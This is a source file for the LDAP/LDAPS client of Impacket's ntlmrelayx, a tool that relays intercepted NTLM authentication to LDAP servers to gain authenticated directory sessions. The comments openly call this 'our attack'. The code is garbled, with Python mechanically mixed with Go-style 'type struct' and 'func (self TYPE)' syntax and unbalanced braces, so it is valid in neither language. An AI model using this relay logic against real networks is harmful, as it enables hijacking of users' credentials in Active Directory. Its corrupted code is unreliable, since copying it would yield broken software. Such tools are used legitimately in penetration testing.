// SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
//
// This software is provided under under a slightly modified version
// of the Apache Software License. See the accompanying LICENSE file
// for more information.
//
// LDAP Protocol Client
//
// Author:
//   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
//   Alberto Solino (@agsolino)
//
// Description:
// LDAP client for relaying NTLMSSP authentication to LDAP servers
// The way of using the ldap3 library is quite hacky, but its the best
// way to make the lib do things it wasn't designed to without touching
// its code
//
import sys
from struct import unpack
from impacket import LOG
from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD
from ldap3.operation import bind
try:
    from ldap3.core.results import RESULT_SUCCESS, RESULT_STRONGER_AUTH_REQUIRED
except ImportError:
    LOG.fatal("ntlmrelayx requires ldap3 > 2.0. To update, use: pip install ldap3 --upgrade")
    sys.exit(1)

from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN
from impacket.spnego import SPNEGO_NegTokenResp

PROTOCOL_CLIENT_CLASSES = ["LDAPRelayClient", "LDAPSRelayClient"]

 type LDAPRelayClientException struct { // Exception:
    pass

 type LDAPRelayClient struct { // ProtocolClient:
    PLUGIN_NAME = "LDAP"
    MODIFY_ADD = MODIFY_ADD

     func (self TYPE) __init__(serverConfig, target, targetPort = 389, extendedSecurity=true  interface{}){
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = nil
        self.authenticateMessageBlob = nil
        self.server = nil

     func (self TYPE) killConnection(){
        if self.session is not nil {
            self.session.socket.close()
            self.session = nil

     func (self TYPE) initConnection(){
        self.server = Server("ldap://%s:%s" % (self.targetHost, self.targetPort), get_info=ALL)
        self.session = Connection(self.server, user="a", password="b", authentication=NTLM)
        self.session.open(false)
        return true

     func (self TYPE) sendNegotiate(negotiateMessage interface{}){
        // Remove the message signing flag
        // For LDAP this is required otherwise it triggers LDAP signing

        // Note that this code is commented out because changing flags breaks the signature
        // unless the client uses a non-standard implementation of NTLM
        negoMessage = NTLMAuthNegotiate()
        negoMessage.fromString(negotiateMessage)
        //negoMessage["flags"] ^= NTLMSSP_NEGOTIATE_SIGN
        self.negotiateMessage = negoMessage.getData()

        // Warn if the relayed target requests signing, which will break our attack
        if negoMessage["flags"] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN {
            LOG.warning("The client requested signing. Relaying to LDAP will not work! (This usually happens when relaying from SMB to LDAP)")

        with self.session.connection_lock:
            if not self.session.sasl_in_progress {
                self.session.sasl_in_progress = true
                request = bind.bind_operation(self.session.version, 'SICILY_PACKAGE_DISCOVERY')
                response = self.session.post_send_single_response(self.session.send('bindRequest', request, nil))
                result = response[0]
                try:
                    sicily_packages = result["server_creds"].decode("ascii").split(";")
                except KeyError:
                    raise LDAPRelayClientException('Could not discover authentication methods, server replied: %s' % result)

                if 'NTLM' in sicily_packages {  // NTLM available on server
                    request = bind.bind_operation(self.session.version, 'SICILY_NEGOTIATE_NTLM', self)
                    response = self.session.post_send_single_response(self.session.send('bindRequest', request, nil))
                    result = response[0]

                    if result["result"] == RESULT_SUCCESS {
                        challenge = NTLMAuthChallenge()
                        challenge.fromString(result["server_creds"])
                        return challenge
                } else  {
                    raise LDAPRelayClientException("Server did not offer NTLM authentication!")

    //This is a fake function for ldap3 which wants an NTLM client with specific methods
     func (self TYPE) create_negotiate_message(){
        return self.negotiateMessage

     func (self TYPE) sendAuth(authenticateMessageBlob, serverChallenge=nil interface{}){
        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP {
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2["ResponseToken"]
        } else  {
            token = authenticateMessageBlob
        with self.session.connection_lock:
            self.authenticateMessageBlob = token
            request = bind.bind_operation(self.session.version, 'SICILY_RESPONSE_NTLM', self, nil)
            response = self.session.post_send_single_response(self.session.send('bindRequest', request, nil))
            result = response[0]
        self.session.sasl_in_progress = false

        if result["result"] == RESULT_SUCCESS {
            self.session.bound = true
            self.session.refresh_server_info()
            return nil, STATUS_SUCCESS
        } else  {
            if result["result"] == RESULT_STRONGER_AUTH_REQUIRED and self.PLUGIN_NAME != 'LDAPS' {
                raise LDAPRelayClientException("Server rejected authentication because LDAP signing is enabled. Try connecting with TLS enabled (specify target as ldaps://hostname )")
        return nil, STATUS_ACCESS_DENIED

    //This is a fake function for ldap3 which wants an NTLM client with specific methods
     func (self TYPE) create_authenticate_message(){
        return self.authenticateMessageBlob

    //Placeholder function for ldap3
     func (self TYPE) parse_challenge_message(message interface{}){
        pass

 type LDAPSRelayClient struct { // LDAPRelayClient:
    PLUGIN_NAME = "LDAPS"
    MODIFY_ADD = MODIFY_ADD

     func (self TYPE) __init__(serverConfig, target, targetPort = 636, extendedSecurity=true  interface{}){
        LDAPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

     func (self TYPE) initConnection(){
        self.server = Server("ldaps://%s:%s" % (self.targetHost, self.targetPort), get_info=ALL)
        self.session = Connection(self.server, user="a", password="b", authentication=NTLM)
        self.session.open(false)
        return true
